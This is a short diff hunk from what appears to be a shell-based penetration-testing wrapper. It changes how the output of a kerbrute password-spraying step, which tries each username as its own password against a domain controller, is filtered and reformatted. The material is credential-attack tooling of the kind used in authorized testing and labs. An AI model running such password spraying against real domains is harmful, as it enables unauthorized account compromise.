@@ -559,7 +559,7 @@ Examples:
         ezpz_header "Bruteforcing credentials with username as password"
         if test -s $users_tmp
             ezpz_cmd "kerbrute passwordspray --dc $dc_ip -d $target_domain $users_tmp --user-as-pass"
-            ezpz_spin kerbrute passwordspray --dc $dc_ip -d $target_domain $users_tmp --user-as-pass | grep -aoE "VALID LOGIN.*" | sed -E 's/\x1B\[[0-9;]*[A-Za-z]//g'
+            ezpz_spin kerbrute passwordspray --dc $dc_ip -d $target_domain $users_tmp --user-as-pass | grep -aoE "VALID LOGIN.*" | sed -E 's/\x1B\[[0-9;]*[A-Za-z]//g; s/^(VALID LOGIN( WITH ERROR)?):[[:space:]]*/\1: /'
         else
             ezpz_error "User list is empty. Run RID bruteforce first. Skipping."
         end
